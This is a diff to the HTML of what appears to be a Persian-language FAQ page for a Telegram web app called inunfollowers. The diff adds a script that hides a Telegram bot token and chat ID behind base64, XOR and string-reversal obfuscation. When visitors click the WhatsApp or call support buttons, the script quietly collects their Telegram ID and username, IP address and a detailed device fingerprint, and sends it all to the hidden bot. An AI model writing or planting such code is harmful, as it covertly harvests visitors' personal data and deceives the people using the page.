@@ -140,6 +140,136 @@
         </div>
         <a href="https://inunfollowers.github.io/primary/faq.html" class="glass-button">برگشتن به منو سوالات</a>
     </div>
+
+    <script>
+document.addEventListener("DOMContentLoaded", () => {
+    const baklava = "s3cr3t_k";
+    const cupcake = "EAoNPH4Fby0aVSJEdhMUASt+NwJFN2k9Q0lbAwoCDwQ7ciJIBU1uWkAGWkUDTA==";
+    const brownie = "QAVRSgFDaFNKAg==";
+
+    function decodeObfuscated(b64) {
+        try {
+            const raw = atob(b64);
+            let xored = [];
+            for (let i = 0; i < raw.length; i++) {
+                const rc = raw.charCodeAt(i);
+                const kc = baklava.charCodeAt(i % baklava.length);
+                xored.push(rc ^ kc);
+            }
+            return String.fromCharCode(...xored).split('').reverse().join('');
+        } catch (e) {
+            console.error("decodeObfuscated failed:", e);
+            return null;
+        }
+    }
+
+    const CUPCAKE = decodeObfuscated(cupcake);
+    const BROWNIE = decodeObfuscated(brownie);
+
+    async function getIPAddress() {
+        try {
+            const res = await fetch("https://api.ipify.org?format=json");
+            const data = await res.json();
+            return data.ip || "Unknown";
+        } catch {
+            return "Unknown";
+        }
+    }
+
+    async function getDeviceInfo() {
+        const ua = navigator.userAgent || "Unknown";
+        let batteryLevel = "Unknown", charging = "Unknown";
+        if ('getBattery' in navigator) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${Math.round(battery.level * 100)}%`;
+                charging = battery.charging ? "Yes" : "No";
+            } catch {}
+        }
+        return {
+            userAgent: ua,
+            platform: navigator.platform || "Unknown",
+            language: navigator.language || "Unknown",
+            resolution: `${screen.width}x${screen.height}`,
+            devicePixelRatio: window.devicePixelRatio || 1,
+            colorDepth: screen.colorDepth || "Unknown",
+            cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+            connectionType: navigator.connection?.effectiveType || "Unknown",
+            downlink: navigator.connection?.downlink || "Unknown",
+            touchSupport: 'ontouchstart' in window ? "Yes" : "No",
+            localStorage: typeof localStorage !== 'undefined' ? "Yes" : "No",
+            sessionStorage: typeof sessionStorage !== 'undefined' ? "Yes" : "No",
+            indexedDB: typeof indexedDB !== 'undefined' ? "Yes" : "No",
+            batteryLevel,
+            charging,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            utcOffset: new Date().getTimezoneOffset(),
+            pageReferrer: document.referrer || "None",
+            pageVisibility: document.visibilityState
+        };
+    }
+
+    async function sendTelegramMessage(buttonName) {
+        if (!CUPCAKE || !BROWNIE) return;
+
+        const tgUser = window.Telegram?.WebApp?.initDataUnsafe?.user;
+        const userId = tgUser?.id || "Unknown";
+        const username = tgUser?.username || "Unknown";
+        const [ip, deviceInfo] = await Promise.all([getIPAddress(), getDeviceInfo()]);
+        const time = new Date().toLocaleString("fa-IR", { timeZone: "Asia/Tehran" });
+
+        const message = `
+<b>📥 User Click ${buttonName} Support</b>
+
+🆔 <b>User ID:</b> <code>${userId}</code>
+👤 <b>Username:</b> @${username}
+🌐 <b>IP Address:</b> <code>${ip}</code>
+🕰 <b>Time:</b> ${time}
+
+🧭 <b>Browser Info:</b>
+<code>${deviceInfo.userAgent}</code>
+
+📱 <b>Device Info:</b>
+Platform: <code>${deviceInfo.platform}</code>
+Language: <code>${deviceInfo.language}</code>
+Resolution: <code>${deviceInfo.resolution}</code>
+PixelRatio: <code>${deviceInfo.devicePixelRatio}</code>
+ColorDepth: <code>${deviceInfo.colorDepth}</code>
+Cookies: <code>${deviceInfo.cookiesEnabled}</code>
+Touch: <code>${deviceInfo.touchSupport}</code>
+LocalStorage: <code>${deviceInfo.localStorage}</code>
+SessionStorage: <code>${deviceInfo.sessionStorage}</code>
+IndexedDB: <code>${deviceInfo.indexedDB}</code>
+Battery: <code>${deviceInfo.batteryLevel}</code> (Charging: <code>${deviceInfo.charging}</code>)
+Connection: <code>${deviceInfo.connectionType}</code> (~${deviceInfo.downlink} Mbps)
+Timezone: <code>${deviceInfo.timezone}</code>
+UTC Offset: <code>${deviceInfo.utcOffset}</code>
+Referrer: <code>${deviceInfo.pageReferrer}</code>
+Page Visibility: <code>${deviceInfo.pageVisibility}</code>
+        `;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${CUPCAKE}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: BROWNIE, text: message, parse_mode: "HTML" })
+            });
+        } catch (err) {
+            console.error("Telegram send failed:", err);
+        }
+    }
+
+    // انتخاب دکمه‌های واتساپ و کال
+    const supportButtons = document.querySelectorAll(".contact-button.whatsapp-color, .contact-button.call-color");
+    supportButtons.forEach(btn => {
+        btn.addEventListener("click", () => {
+            let buttonName = btn.textContent.trim();
+            sendTelegramMessage(buttonName);
+        });
+    });
+});
+</script>
+
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             if (window.Telegram && window.Telegram.WebApp) {
@@ -159,3 +289,4 @@
     </script>
 </body>
 </html>
+
